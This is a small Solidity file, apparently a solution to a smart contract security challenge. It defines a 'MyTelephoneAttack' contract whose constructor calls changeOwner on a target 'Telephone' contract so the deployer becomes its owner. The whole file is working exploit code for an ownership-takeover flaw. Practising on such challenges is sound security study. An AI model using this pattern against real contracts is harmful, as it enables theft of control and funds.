// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

interface Telephone {
    function changeOwner(address _owner) external;
}

contract MyTelephoneAttack {
    constructor(address telephoneAddress) {
        Telephone(telephoneAddress).changeOwner(msg.sender);
    }
}
